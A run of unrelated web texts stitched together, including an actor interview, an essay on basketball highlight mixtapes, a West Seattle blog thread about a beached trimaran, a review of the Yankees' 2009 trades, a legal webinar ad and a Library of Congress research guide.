They do, but what I’m saying is that Telefilm’s new mandate is going in the wrong direction. Where it used to go to an Atom Egoyan film, they’re sort of switching it around and putting it into other areas that I don’t think people are that impressed with.
Do you miss being based in Canada?
Well, when I did Underworld 2, I was in Vancouver for five months and I was reminiscent to be back up there. Do I miss it? Yeah, I miss a lot of things about it, but I’m not moving back up there.
Do you live alone or do you have a special lady?
No, I live alone.
What kind of house?
Oh, it’s just a house, man. It’s just a small house.
What part of LA?
East side, closer to downtown.
Why?
It’s a great area. That’s actually now there’s a lot of active development there. It’s a great area, it’s got a lot more culture, it’s a lot easier to walk around in and see other people besides actors in the industry. You’re not faced with the industry every day and I like that.
Can you just walk around?
Absolutely. Sure, absolutely.
Has that gotten better since the show ended?
I wouldn’t say that. I wouldn’t say that at all. It’s never been that crazy for me.
Are you recognized by a different group of people since Underworld?
A little bit, but it’s really not- – it’s not extreme at all. I can walk down the street all day and people look at me, but they don’t talk to me or stop me.
You don’t crave that?
It’s not something I think would be a healthy thing.
Do you get scared by the possibility of fame?
Well, it would be sort of irresponsible for me to go do XXX2 and then sit here and talk about how that’s- –
But Vin Diesel in XXX?
Yeah, but that’s Vin Diesel and you can see he’s an action star in that way. You can see that’s what he is. That’s what he should be doing for sure. And I can see he’s a bit of a superstar. That’s not me. But it sort of scares me in a way, but I don’t think it’s going to get any worse for me.
Why can’t you be a superstar?
Not in something like this. I don’t think that’s my thing.
You could be the next XXX?
Well, I don’t know about that. No one’s said that to me. I don’t know if they’d bank on me to be the next XXX. I can’t really see that. It’d be more of a comedy.
If they ask you, would you?
I don’t know if I could handle that. I don’t know if I could do that.
They say they want one with more angst. Who would you like to see next?
Man, I have no idea. I’d say some great actors, but they wouldn’t ever do it. I think Clive Owen or somebody like that would be great. I’d love that if I got to work with him but he ain’t doing it so I have no idea.
Any more looping or reshoots on Underworld?
I don’t think we’ll do any reshoots. I think we got everything. I was doing two units at the same time by the end of the movie.
Will this movie move you career forward?
I hope so.

What makes YouTube so addictive? It’s easy, it’s free and it’s entertaining. You can find everything you want and don’t want to see. According to YouTube’s statistic page, over “100 hours of video are uploaded every minute.” Incredible. In this day and age, if you don’t know what YouTube is, you’re either living under a rock or in North Korea.
With the rise of YouTube came the rise of mixtapes: short, home-cooked basketball highlight videos that run a couple of minutes long, packed with a player’s best plays or a game’s best plays, usually accompanied by an intense, upbeat hip-hop tune and paired with an eye-catching, superlative-filled title that makes the whole experience of watching them more euphoric and entertaining.
Notice — short and entertaining. Short. Simple. Replayable. Repeatable. Play one mixtape, find a suitable Recommended Video, play that mixtape, and repeat. It’s the epitome of a typical YouTube experience, so easy yet so satisfying, and, in the past four to five years, basketball fans all over the world have become hooked onto this drug. It’s sensationalized how we watch the game by only showing what people want to see — high-flying dunks, ankle-breaking crossovers, sweet dimes — sugar-coated forms of basketball that are marketed to and enjoyed by even the most novice basketball fan.
Companies such as Ball Is Life and HoopMixTape have sprung out of this lucrative market in the past few years, finding the nation’s best basketball players and making mixtapes of them. But National Basketball Association players are already nationally televised, and most of the top college players also are, too. So what’s left? High schoolers and middle schoolers, mostly, scattered in high school and recreational gyms across the country. These companies fly across the country to seek out the nation’s top young talent, hire professional videographers to film their games, and create mixtapes for the “BOUNCIEST 14-year-old on the planet!!” or the “8-year-old with MORE HANDLES than YOU and YOU and YOU!!” With such bold, provocative statements, people click, people stay and people buy in. The more people click, the more people share — it’s a cycle that can’t be stopped.
But, as basketball fans, the use of mixtapes becomes dangerous when we start to buy in too much, and the highlights become so ingrained into our perception of basketball that they begin to skew the way we understand the game. Specifically, we cross the line when we form premature judgements about these young players and try to predict their success in college or in the NBA, with our knowledge of these players coming from mostly (if not completely) their mixtapes.
Think of mixtapes as the Sparknotes of basketball. We read the Sparknotes, a condensed version of the book we were supposed to read for English, and we feel convinced that we know enough about the book to get by. But when that reading quiz appears on our desks, or that essay assignment appears on Schoology, that’s when we truly realize that what we picked up from Sparknotes turned out to be insufficient, because, simply put, we have to read the book to understand it. In the same way, mixtapes and highlight reels provide an incomplete picture of a basketball player’s skill-set, work ethic, mentality and everything else that it takes to be a basketball player.
Out of all of the hyped-up players in the past few years, the recruiting class of 2013 best represents the dangers of this phenomenom. It’s no lie: in the past few years, experts around the country have touted this as the future of basketball and the best recruiting class since the 2003 NBA Draft class (Lebron James, Dwayne Wade, Carmelo Anthony, etc.). In their junior and senior years, members of this “elite” class had their college decisions nationally televised and their scouting processes closely tracked. Although none would admit it, even NBA teams seemed to be clearing cap space and building their rosters in anticipation for the 2014 NBA Draft, when most of these players would be available.
Listen to some of these comparisons: Andrew Wiggins, a freshman at Kansas, was called “Canadian Lebron” by GQ Sports. As a junior in high school, Jabari Parker, now a freshman at Duke, graced the cover of Sports Illustrated and was deemed “The best high school basketball player since Lebron… .” Julius Randle, a freshman at the University of Kentucky, was named “Kentucky’s New King.” Aaron Gordon, local Archbishop Mitty alum and freshman at Arizona University, had a whole ESPN segment dedicated to comparing him with NBA All Star Blake Griffin. And the list continues.
To some extent, the praise is merited. But now, with a year of college basketball under their belts, it’s been clear that while this is still one of the more talented classes, it’s definitely not the saving grace of basketball that many hoped it would be. Parker and Wiggins have looked the most impressive out of the class — solid, explosive, with the potential to become stars, but at times their consistency and effort are questionable. Randle and Gordon, while both physically monsters at the high school level, have struggled to translate that dominance into a much bigger, faster college game. Andrew and Aaron Harrison (the Harrison twins), both top 5 players in the class, have vastly underperformed on a disappointing Kentucky team.
So if they aren’t as great as they’re reputed, what blinded us from seeing the truth about these players? What made us overestimate their abilities as basketball players?
To a large extent, mixtapes. If we look back and try to find the reasons behind the hype, we’ll find that a large part of this commotion started because early mixtapes dragged these players into the spotlight at an extremely young age. The most memorable: a Hoopmixtape video uploaded in 2009 entitled “Best 13 Year Old In The Nation 6’6 Andrew Wiggins!” that has racked up over 4.5 million views since. Thirteen years old?! Has this kid even had his Bar Mitzvah yet?!
Including that Wiggins video, countless mixtapes have appeared on YouTube, featuring dozens of the top players in the class of 2013 playing high school, Amateur Athletic Union and even Team USA basketball, amassing millions of hits and generating unprecedented buzz. Remember five-foot-six-inch Aquille “Crimestopper” Carr, whose two Hoopmixtape videos accumulated over 5.5 million views each and earned him a segment on CNN as Basketball’s Next Big Thing? After his 15 minutes were up, he skipped college, tried his hand at professional basketball in China, then returned to the States and played for the Delaware 87ers, a NBA Developmental League team. Earlier this year, he was actually cut by the 87ers, but did not give up on his dream to play in the NBA and will declare for the 2014 NBA Draft. I applaud his tenacity and his bravery, but “Basketball’s Next Big Thing?” Maybe just a little far-fetched, CNN.
Ted Young, senior guard at Archbishop Mitty High School and Aaron Gordon’s teammate last season, witnessed Gordon’s journey firsthand. To fans, Young believes that mixtapes misrepresented Gordon’s game: because many people only knew Gordon through his mixtapes, which were mostly comprised of Gordon dunking, people formed misconceptions that “all he could do was dunk.” This is Gordon’s tape at 16-years-old:
“What people don’t understand is that mixtapes showcase the best three minutes of a whole season, which is actually hours of actual basketball,” Young said. “For example, the perception was that Aaron could only dunk, which was not true, its just that for mixtapes what people want to see are rim-crushing posters, which Aaron does do, on top scoring from almost anywhere on the court, making nice passes to wide-open teammates, like me, playing lock down defense and grabbing rebounds for days.”
Young noted that this in turn added to the pressures and expectations that were unnecessarily and unreasonably placed on Gordon and others in his class.
“The praise is merited but the expectations are unfair,” he said. “I guess it’s okay to have such great expectations, but if they don’t meet the expectations, they shouldn’t be considered failures. It’s never fair to put pressure on players.”
These players aren’t the ones putting the mixtapes out there themselves; all of this attention and limelight is just as unexpected to the players as it is to fans. They aren’t asking to be called the next Lebron James or the next Blake Griffin, but they’re branded with these comparisons that will forever shape how people perceive their success. The sky-high expectations put on these young athletes are not only unfair to fans, who are deceived into believing that the next big thing is right around the corner, but more importantly, unfair to the players, who are criticized if they don’t live up to these unreasonable expectations.
Charles Barkley, former NBA MVP and Dream Team member, revealed in an interview with Sports Illustrated writer Richard Deitsch his issues with this same problem.
“Why would I watch a high school player?” Barkley told Deitsch. “That’s stupid. I’ve heard all the stuff. OK, he’s a great high school player. Let me see what happens when he gets to college. When people ask me who will be the Rookie of the Year, I say, ‘I.”
That’s the other thing: these players, these projects, these celebrities, are children. Teenagers. The most irrational, volatile creatures that exist. As these players progress from high school to college to the NBA, the competition gets bigger, faster, stronger, tougher and the spotlight shines a little brighter: all of these factors completely change the game from one stage to the next, and as fans we need to place more emphasis in judging players on attributes that will translate on all levels: their effort on defense, how unselfish they play, how they handle themselves off the court, etc. We try to calculate how they will end up, but we leave out many uncontrollable variables that could throw their lives in completely different directions.
To be fair, mixtapes aren’t all bad, either. Despite all of the negative impacts, Young admits that Gordon’s videos created a platform that increased Gordon’s publicity and fame, and allowed almost anyone, perhaps even scouts and coaches, to watch him play.
“Mixtapes have both positive and negative effects,” Young said. “On the positive side, mixtapes can allow basketball fans to see the highlight of the best players in the nation from all over the country. For example, before mixtapes only people in the Bay Area could see Aaron [Gordon]‘s highlights, but thanks to mixtapes the whole country can now ‘ooh and ahh’ over his poster dunks.”
People often forget that the production of mixtapes is first and foremost a business. In its essence, it’s a form of easy-to-enjoy entertainment, much like video games, romantic comedies and instant noodles. Companies have capitalized on this untapped source of entertainment, and they’ve struck gold. So, as consumers, we should consume it just as that: entertainment, and nothing else.
If you don’t remember anything else, remember this: Hype is volatile, but often misguided, so treat it with caution. And if you can’t take it from me, then take it from former NBA coach and basketball broadcasting legend Dick Vitale. DICKY V, BABY!
“I think we’re all guilty of wanting instant gratification,” Vitale said on-air during a Dec. 10 college basketball game last year. “I said that on SportsCenter and I really believe that; we rate and evaluate these kids so early.”
Now, all we can do is hope that we won’t chase ourselves deeper and deeper into this abyss of “instant gratification.” Living in an ever-evolving, ever-increasing age of technology, we can all benefit from taking a step back from our phones, tablets or computers and acquiring a broader perspective, coming to conclusions without making snap judgements and slowing down.
And, for basketball’s sake, let’s just hope that YouTube stays the way it is, that it doesn’t condense even further into, say, six-second videos, set on repeat, capturing video in even more limited frames, making “instant gratification” just a little more “instant.” Oh, but someone already has: Vine.
As Barkley would say, turrible, just turrible.

Nice job!!
Nice job!
I’m so happy for you! Congratulations!
congrats you speed demon! cute outfit btw.
Amazing! Go Tina!
Congrats!!!
Awesome job! That has to be such a great feeling. I’ll have to “get after it” in my next race
Congrats! That must have felt so awesome! I can attest to how hard the hills on the course must be as my hometown of Canton is quite hilly (especially compared to flat, flat Tampa)! But it looks like you went through some pretty wooded and scenic areas, and the cooler weather must have been nice. Under 24:00 after only running a little bit in recent months is great. And I love the color of those shirts!
Great job Tina!
CONGRATS!!!! And I am all about getting my hubby some Reebok threads. Watching the Games on TV makes me want even more gear too!
Way to go!!! Sub 25 wow! I am still working on cracking the 30 minute mark (I missed it by 4 seconds last November!)

Love the matching outfits. Congrats on the PR. What an awesome success, which is the best when you least expect it!

A lot of people think that everything George Strait touches turns to gold. For the most part, I would say that’s true, but I have proof that not everything George Strait does is perfect. I don’t think it’s his fault, but the age of this video and the shy awkwardness for Strait makes for a good laugh.
From the comments on this video, it appears it’s from a mid-80′s Perry Como Christmas special. George is obviously told be the producers of the show to lip-sync his Christmas hit, ‘When It’s Christmas Time In Texas’ while strolling through some tables and shaking hands with those seated there. It turns quite comical watching George try to remember to sing and look like he’s having fun.Followup: Troubled trimaran now beached along Beach DriveFebruary 14, 2013 at 11:38 am | In West Seattle beaches, West Seattle news | 36 Comments
This morning, we went out looking for the trimaran last reported in trouble off Emma Schmitz Viewpoint, as noted by Beach Drive Blog. Didn’t see it and hoped that meant all was well. Then we got the photo from Michelle, who says that since she’s taken it, the trimaran has now gone completely aground by Harbor West (the over-water condos in the photo). She says the captain is safe – she helped him get out of the water earlier, and he’s now napping. What happens next depends on when he wakes up and what happens when the tide comes in.
1:38 PM UPDATE: Police were at the scene earlier checking on this but then were notified the boat’s owner is OK; we took a new photo (above). Neighbor Michelle, meantime, reports he has called the Coast Guard and is coming back at high tide.
10:44 PM NOTE: This isn’t resolved yet, according to Michelle, who says the owner is apparently going to try again tomorrow. Beach Drive Blog has an update, and commenters here have some additional info, including reports that the trimaran was recently listed as available for free.

That trimaran left from O Dock @ Shilshole Bay Marina yesterday. It was in extremely poor shape. The guy was trying to tow it to Tacoma. Still trying to figure out why he had couches on the deck.
Comment by nwesterne — 12:25 pm February 14, 2013 #
Michelle should immediately call the coast guard at 217-6200. This is not a normal occurrence and if this boat drifts again it will be a hazard to navigation. Also question the logic in letting a stranger “sleep it off” after almost sinking his boat in a residential / populated area.
Comment by CP — 12:30 pm February 14, 2013 #
Police have responded AND the boat owner has spoken with the Coast Guard, per the police (who we talked to a little while ago, after going back down for a firsthand look) and correspondence with Michelle. Owner has left there but is due back at high tide. Adding all this to the update.

Good news – thanks, Tracy.
Comment by CP — 12:38 pm February 14, 2013 #
HA! this was on craigslist last week for free. My buddy took a picture of it (the couch) while still at the dock at Shilshole and sent it to me and a bunch of other friends …now the thing is in the news. It was destined to fail.
Comment by bamboo — 1:11 pm February 14, 2013 #
Is the other boat in the first picture part of the equation? Some one said he was trying to tow the trimaran? Any word on what happened?

Here’s what BDB reported yesterday – and yes, the smaller boat is somehow related, you’ll see it in their photo:

Don’t know anything beyond that, so far. We have not seen the owner in person to ask him.

Take a look at the second picture on the Beach Drive blog. That thing’s a real peach.
Comment by valvashon — 2:21 pm February 14, 2013 #
He had fallen in the water and was hypothermic so I brought him in to warm him up and then he fell asleep drinking tea. I’m from Alaska, you warm them up then ask questions :) Perhaps 911 would have been a good second choice…hindsight and all.
That said the Coast Guard, Harbor Police and Seattle Police Department have all been called but no one can do anything.
Comment by michelle — 2:48 pm February 14, 2013 #
Bamboo, I saw it on Craigslist last week too! I was wondering if it was the same one. The whole thing is fishy…..couches on deck? Towing by a much smaller vessel? Captain sleeping? Was he doing this by himself? Jeeze, when the tide does finally come in, the way that it sits now, it will run right into the deck of the apartments! And to top it all off, that will be in the middle of the night. I would bet neither boat has navigation lights.
Comment by Stephanie — 2:53 pm February 14, 2013 #
Yikes… I’ll update our post with a link back – Tracy. We assumed he fixed everything the last time my husband talked to the captain.
Comment by Rhonda Porter — 3:15 pm February 14, 2013 #
Michelle – you are a kind soul and did exactly what I would have done under the circumstances. Hypothermia is nothing to mess around with. Presumably, this guy is doing the best he can with the resources at hand, whether it makes sense to others or not.
Best way to get a free couch to Tacoma? on the boat you’re already dragging there – that’s efficiency!
Hope all goes well,the rising tide safely lifts this boat and her couch and her person and that the current aids in their travel to Tacoma.

Comment by sw — 4:00 pm February 14, 2013 #
The guy WAS alone when he left Shilshole. He was ill-prepared with way too little clothing and a very jerry-rigged setup for towing/steering both vessels at the same time. His plan was to tow it to Tacoma, but he didn’t even leave the dock @ Shilshole till after noon. He’s lucky to be alive. Rumor has it the Port of Seattle apparently set the ball rolling with this whole fiasco by giving the boat away for free. That’s a story for someone else to look into. They had workers on the dock for his departure to keep him from running into other boats on the way out.
Comment by OT — 4:04 pm February 14, 2013 #
I remember when the Skipper had some trouble like that with the Minnow. All on a three hour tour!
Comment by Gilligan — 4:46 pm February 14, 2013 #
I saw this guy down at Shilshole with a tow sticker on his van and the power boat full of furniture. Had to see what was next, marina attendant shows up and said he was buying a boat. Came back up an hour later and he was loading furniture onto the Tri, had a couch on a dock cart by himself. Still cracking up.
Comment by Cyrus — 5:25 pm February 14, 2013 #
I wonder if he has warm dry clothes? It’s going to be cold waiting for the Coast Guard.

He’s going to try and make some fiberglass repairs on the next couple of low tides but is concerned the resin won’t cure due to temp. Saturday is forecasted to be blowing up to 25 knots from the SW. I’m worried about this dude. Update on

This boat was a neighbor of mine at Shilshole. It had been built by a guy who never got it out of Puget Sound and recently it was taken over by the guy’s son. I believe the son found out that the boat was worthless but would cost him $1000′s to properly dispose of it, so I suspect it was given away to escape the liability. There is always the “greater fool” as they say.
Sad to say, there are many other boats out there in similar condition at Shilshole and elsewhere that are potential hazards waiting to happen, either by sinking and rolling over at the dock, burning due to bad wiring, auto bilge pumps putting oil into the water, etc. It’s always a balance to strike between personal property rights and protection of public and private marinas and surrounding environment, but in my view the Port should have dealt with this problem boat a long time ago.
Comment by eaglewatch — 9:27 pm February 14, 2013 #
If this issue began with the city giving away a boat they should bear some responsibility for the beached trimoron.
Comment by Uncle Joe — 11:16 pm February 14, 2013 #
$10,000 fine for any (I mean any) release of oil into the waterways.
Comment by Eddie — 6:28 am February 15, 2013 #
This is a HUGE problem that’s bedeviling regulatory AND tax payers. Let alone the environmental damage that is created by morons like this guy trying to haul away this useless junker. Hoarders in their own homes are generally only a hazard to themselves. Boat hoarders are putting our waterways and tax base at risk. I agree the previous owner bears some culpability for giving it away free, but the person who thought they could tow this junker to Tacoma was ill-prepared and none too smart. I’m sure he’s also pretty much peniless, which means we pick up the tab for the disposal of this useless scow.
Comment by Tony S — 9:00 am February 15, 2013 #
Boat has no engine or fuel onboard from what I was told by owner last fall when it was posted on craiglist for free ? This is strictly a case of someone with big dreams and no experience. Boat was fair shape with some good rigging, alot of potential in the right hands, but needed a few easy things done before leaving the dock. 99% of boating disasters it is the owners or capt’n at fault as in this case. I don’t see a happy ending on this as of last night he had not started patching holes as needed and is running out of time very quickly and will need help as he does not have the proper experience for his dream to continue.
Comment by wetone — 9:15 am February 15, 2013 #
any update on the coast guard? Are they going to help this fella and the boat?
Comment by Rhonda Porter — 3:28 pm February 15, 2013 #
You know, I need an excuse to get back out in the sunshine – we were about to take a walk when the Seaview burglary arrest broke out. Will go down and see what’s up. – TR
Comment by WSB — 3:33 pm February 15, 2013 #
I believe that this vessel sank at the dock at least once while at Shilshole. I doubt if a poorly maintained boat like this had much value beyond some deck hardware and scrap metal. One way or another it’s headed for a landfill or the bottom of Puget Sound. Let’s hope it’s the former.
Comment by eaglewatch — 3:44 pm February 15, 2013 #
Update of sorts – someone just sent me a note saying the guy “got stuck this morning” and needs anyone who can help, to help. I wrote back to explain this is actually his third day beached on Beach Drive. The photo she sent shows the boat still on the rocks by Harbor West. And now I see your tweet …

The only “important story” here is what happens after the boat sinks out there. (I.E.: how the owner will be fined for polluting our sound with his bad idea-$$ or years of community service if he’s indeed broke)

Want to thank those who saved me and those who helped me. I was told very nice people read this, as already proven, and to ask for help here. I do not know how to do that, I can barely think at 4 AM, after so little sleep all week, as I get ready to save what is left of my red boat if at all possible this morning. Help would be greatly appreciated to do that. Thank you all so much.

Salley award recipient credits military with citizen, Soldier skills
April 7, 2014
By Staff Sgt. Emily Anderson, 80th Training Command Public Affairs
Related Links
Command Sgt. Maj. Louis Santos' leadership skills are tested daily as a business owner, in his civilian capacity, and as a senior leader and advisor at the 7/98th Regiment, 3rd Brigade, 94th Training Division.
"The Army has given me the confidence and ability to take on challenges," said Santos, the owner of an electrical contracting company. "I love what I do in the military, and the leadership skills translate to what I do on the civilian side."
In March, Santos received the 80th Training Command (Total Army School System) Command Sgt. Maj. Morris Salley Jr., Award.
"When I was told I was nominated I felt it was an honor," said Santos, a resident of Falls River, Mass. "I was thrilled and surprised that I had won because there were some fine sergeants major nominated."
The 80th TC commissioned the Command Sgt. Maj. Morris Salley Jr., Award to recognize the battalion command sergeant major who most diligently carries out his or her duties and responsibilities.
According to the criteria, the award is presented annually in honor and remembrance of Command Sgt. Maj. Morris Salley Jr., who served at the command when it was the 80th Division (Institutional Training).
"The award represents leadership and service," Santos said. "As leaders we have to understand that our Soldiers are trying to find a balance with family and our civilian and military careers."
Santos said his military experience, past and present, has helped him as a civilian and shaped him as the leader that he is today.
"When I was a private, my platoon sergeant would say 'I want you to do this, and this is why,'" Santos said. "At the time I didn't realize he was setting me up for success and mentoring me at the same time."
Those same methods come in handy today when Santos mentors Soldiers, as he in turn tries to help them succeed.
He recommends entrepreneurship to Citizen-Soldiers because of the difficulty involved in balancing a civilian and military career, and because it has worked for him.
"I have been lucky and fortunate to own my own company," he added. "I don't think I would own my own business if I wasn't in the military."Plane Lands On Anchorage Street Median

Has today been a slow day for everyone else, too? Maybe I’m still reeling from all the turkey, but my day has been nothing but television nonsense, a few Bob Dylan albums and plans for a Chinese food dinner.
In the spirit of more exciting days to come, let’s look back. At this point, I don’t think anyone would be surprised to see Brian Cashman pull off a Nick Swisher-type three-for-one trade to open some spots on the 40-man, so let’s look back at the Yankees 2009 trades. A some point next week we might add to this list.
February 2: LHP Chase Wright to the Brewers for C/OF Eric Fryer
Why? Because Wright had been designated for assignment and Fryer seemed to (possibly) have a little bit of upside as an older prospect.
Good move? Small move but a good one. Wright won nine games in the Pacific Coast League but ultimately became a free agent without ever geting to Milwaukee. Fryer didn’t do much in High-A Tampa but was part of the Eric Hinske trade.
March 22: Cash (money, not Kevin) to the White Sox for C Chris Stewart
Why? Because Stewart was terrific as Scranton/Wilkes-Barre’s regular catcher the year before. Also, Francisco Cervelli was set to open in Double-A and catching depth can be vital.
Good move? Yep. Catching depth proved important as both Cervelli and Kevin Cash wound up catching in the big leagues, and Stewart once again had a terrific season in Triple-A. It would have been nice to see P.J. Pilittere get more Triple-A at-bats, but Stewart’s a great player to have around, especially with all of those good young arms on the Triple-A staff.
March 28: RHP Jason Jones to the Twins for RHP Charles Nolte
Why? Because Jones was a returned Rule 5 pick who had no place to pitch in the Yankees organization, and Nolte had a 2.00 career ERA in two minor league seasons.
Good move? Sure. Neither pitched especially well — ERAs above 5.00 for both – but at least Nolte is younger. Jones deserved a shot at Triple-A and he wasn’t going to get it with the Yankees.
May 16: RHP Eric Hacker to the Pirates for RHP Romulo Sanchez
Why? Because Hacker had been designated for assignment and trading him was better than losing him on waivers (which is exactly what happened to Steven Jackson a few days later). Sanchez had a big arm and some big league experience.
Good move? Absolutely. Hacker pitched pretty well and got to the big leagues, but he was ultimately outrighted off the Pirates roster. Sanchez, meanwhile, came into his own when he moved into the Scranton/Wilkes-Barre rotation and was added to the Yankees 40-man. As far as DFA trades go, this could hardly have worked any better.
June 24: RHP Jose Veras to the Indians for Cash (money, not the general manager)
Why? Because Veras had been designated for assignment after a 5.96 ERA.
Good move? At least the Yankees got something for Veras. I had honestly forgotten all about him until working on this post. He pitched a little better for the Indians — 4.38 ERA – but it’s hard to imagine Veras playing any sort of role for the Yankees in the second half.
June 30: RHP Casey Erickson and C/OF Eric Fryer to the Pirates for OF/3B Eric Hinske
Why? Because the Yankees wanted to improve their bench, and the cost of two Class-A players didn’t seem too high a price to pay.
Good move? Probably. Fryer moved back to catcher after spending his brief time with the Yankees as a left fielder, but it was Erickson who was the prize of the deal for the Pirates. He had a 1.17 ERA with 32 strikeouts and only six walks in 38.1 innings with Low-A West Virginia. Erickson pitched well, but Hinske played a role in giving the Yankees their 27th championship, and that was the point of making the trade. Unless Erickson becomes a stud, the move was well worth it for the Yankees.
July 29: Cash (money, not Tango’s partner) to the Rockies for RHP Jason Hirsh
Why? Because the Triple-A team suddenly needed another starting pitcher. It was initially thought to be a PTBNL deal, but Mark Newman told me recently that the Yankees sent money to complete the trade.
Good move? Yes. Once a big name prospect, Hirsh had struggled through injuries and had terrible numbers before coming to Scranton/Wilkes-Barre, but he pitched well for the Yankees. He’s still in the organization — I have no idea how he’s not a free agent, but he’s not — and he could pitch his way back to the big leagues if he continues to rebound.
July 31: C Chase Weems to the Reds for INF Jerry Hairston Jr.
Why? Because Cody Ransom struggled, Ramiro Pena is young and Angel Berroa isn’t very good. Also the Yankees have a ton of catching prospects, losing one didn’t hurt.
Good move? Hairston got a pie to the face, started a playoff game and improved the Yankees bench. Weems hit .197 for Class-A Dayton. So, yeah, good move.
August 7: Cash (money, not another lame joke) to the Padres for RHP Chad Gaudin
Why? Because Sergio Mitre was the Yankees fifth starter and Josh Towers had been temporarily brought up to give the Yankees a long reliever.
Good move? Not a huge move, but a very good one. Although he played a limited role in the playoffs, Gaudin pitched well down the stretch and could play a role next year.
August 31: (Something) to the Orioles for OF Freddy Guzman
Why? Because Guzman is very, very fast.
Good move? Guess so. Proving that roster rules are for suckers, Guzman made the Yankees postseason roster. His role was extremely minimal, but he was there and that’s got to count for something. The deal was initially announced as a trade for either cash or a player to be named. I don’t remember ever reading that it was finalized, but I’m betting a small amount of money went to the Orioles. I’ll try to remember to ask about it. I can’t imagine the Yankees giving up anything significant.This audio webcast offers an excellent opportunity to hear two well-known attorneys in the consumer litigation, advertising, and marketing areas explain the reach of the Federal Trade Commission’s recent revisions to its Guides for the Use of Environmental Marketing Claims.
Gain tips on how to protect your clients by joining this convenient 60-minute live telephone seminar. The presenters will analyze the framework of the Green Guides and update you on the recent revisions, including new guidance on the use of green seals and certifications, the use of terms such as “recyclable,” “renewable,” and “biodegradable,” and when conducting a life cycle analysis is necessary. The presenters will also provide an update about best practices about how to avoid FTC charges of “greenwashing” and comment on how the new guidance will influence various practice segments and client markets.
All registrants receive a set of downloadable course materials and free access to the archived online program indefinitely.
Despite the FTC’s efforts at providing extensive guidance in this area, as well as aggressive enforcement efforts, there has been a lot of confusion about what kinds of “green” claims are permissible and what kinds will invite FTC scrutiny. Successful advisors to manufacturers, advertisers, and marketers need to understand the new guidance in order to advise their clients about the limits of acceptable green claims. Devote just 60 minutes to this teleconference to hear two leading attorneys in the consumer litigation, advertising and marketing areas explain what to do to help your client to make the most of permissible green claims.
These topics, among others, will be considered:
The new guidance on making general environmental benefit claims;
The specific changes to the 1998 guidance;
The new environmental marketing terms added to the Green Guides, including “renewable materials,” “made with renewable energy,” and “carbon offsets”;
New guidance about seals and certifications;
New guidance about how to substantiate green marketing claims;
Factors to consider in reviewing a client’s marketing/advertising claims.
Attorneys and other legal professionals in consumer litigation, advertising, and marketing should attend this accredited continuing legal education program from ALI CLE.

Northeast News
March 12, 2014
With time, comes change.
The organizers of Culture Without Borders know they are not immune to change. The annual event is celebrating 18 years this March, has already experienced some change by condensing the art exhibit from a traveling showcase into a single gallery location. In the future, organizers know there will be more change, as well.
The annual art exhibit kicked off on Friday, March 7, at the Vine Street Studio, 2033 Vine St., with an opening ceremony. The exhibits will continue to be on display for the public until Saturday, March 29, 2014. Admission into the studio is free.
Rebecca Koop, president and treasurer of Northeast Arts Kansas City, said the event has lasted 18 years because it has accepted change. In its 18 year history, Koop said this is the first time the pieces will be held in one venue. Culture Without Borders, she said, began as a traveling art show that crossed three months and three different locations.
The exhibit moved around to several locations in the Northeast before landing at the American Heartland Theater, formerly located in the Crown Center.
“That location was great because we got a lot more people to the shows,” Koop said.
Since the American Heartland Theater closed and the exhibit doesn’t get a big audience, Koop said the decision was made to have it at the Vine Street Studio. Since the exhibit has been condensed, Koop said she’s thinking about the future and what the next level of the show will be, which she thinks is digital images.
“Change is a good thing,” Koop said, adding she wants to continue to make the show affordable and accessible, while expanding the audience because “the show is for the artists. We put them on a pedestal.”
With each new year, the exhibit gets a new juror and this year it is Jennie Federick. She earned a bachelor of fine arts in fiber from the Kansas City Art Institute, followed by a master of fine arts from Indiana State University. Frederick apprenticed at Twinrocker Handmade Paper and founded Kansas City Paperworks, Inc. in 1983. Federick also taught at several local universities, has been featured in multiple publications and has showcased her work internationally.
When selecting a juror, Koop said she looks for someone with either experience in teaching art or practicing art. The juror spends several hours with the show’s pieces before selecting the winners, which include prizes for best theme, mixed media and 2D and 3D art.
This year’s winners include: Marion Caruthers for best in show, Pat Deeter for 2D art, Rebecca Lawrence for multi media art and Joseph Smith won the theme award.
The success and the future of the show is dependent on the artists and their enthusiasm. Even though she described the event as the little show that keeps going, she said changes are going to have to be made because Northeast Arts Kansas City can’t keep running the event at a loss.
“This needs the community’s support,” Koop said.
The gallery is open for public viewing from 3 – 5 p.m. Wednesday and Thursday and 4 – 6 p.m. on Friday.Capri Capital Partners launches Capri Retail Advisors

Library of Congress
The Library of Congress has the largest collection of materials in the U.S., and possibly the largest collection of legal materials too. The Library of Congress Web site () posts in formation about the library, including its formidable online catalog.
If you have a question, you can call the Library's general Reference Desk (202-707-5222) or their Legal Reference Desk (202-707-5080).
Catalog: The LOC posts an catalog that is comprehensive starting in 1968. Earlier records have been entered selectively. To do a thorough search of pre-1969 materials requires looking through the Main Card Catalog located on the first floor of the Jefferson Building.
Congressional Research Service (CRS): See the separate entry for "Congressional Research Service Reports."
Copyrights: The U.S. Copyright Office is part of the Library of Congress. For copyright information, see "Copyrights."
Document Delivery: The Library has a Duplication Services department (202-707-5640), but they take four to six weeks to make photocopies. In other words, unless you can easily get to the Library, most of the time you'll have to hire a document retrieval service or find another source. Companies that regularly make copies at the Library of Congress include National Corporate Research (800-494-5225), Penco (800-690-7362 or 703-912-9080), Independence Legal Support (240-392-0017 or requests@independencelegalsupport.com), and FSI Research (202-257-7722); for other companies, see "Washington, D.C. Document Retrieval."
Interlibrary Loan: The Library of Congress is a "lender of last resort." That is, you should try to borrow materials from other libraries first. If you can't find something they have anywhere else, though, the Library of Congress will lend to other libraries. The Library posts the relevant policies, contact information and ILL news.
The first step to borrowing from the LOC is to visit First Time Registration for ILL and fill out an online registration form. Once you are registered, you can place orders directly, and the LOC will send out materials when they are ready. For faster service, you can can hire a document retrieval service, such as National Corporate Research (800-494-5225), Penco (800-690-7362 or 703-912-9080), FSI Research (202-257-7722), Independence Legal Support (240-392-0017 or requests@independencelegalsupport.com), or a competitor. You can find a few other companies in the "Washington, D.C. Document Retrieval" entry.
Legislation: The Library also runs the Thomas web site, which posts bills, Congressional Committee information, the Congressional Record and more useful information about Federal legislation. The Library is developing a successor to Thomas called Congress.gov.

People might not like the cooler April temperatures, but apple trees love them.”
Jim Allen
Mr. Allen added that things were really starting to pop now that the trees have broken dormancy and are wide awake.
“Once that happens, the proverbial horse is out of the barn,” he added. “From this point one of two things could happen: If we get cooler temperatures things will slow down a little. Warmer temperatures, conversely, would speed things up.”
The long-term weather forecast for the following month indicates that typical May temperatures would prevail in New York, meaning that days would gradually be growing warmer. Mr. Allen said that this indicates that the bloom, which will start in the Hudson Valley, is right on target for the season.
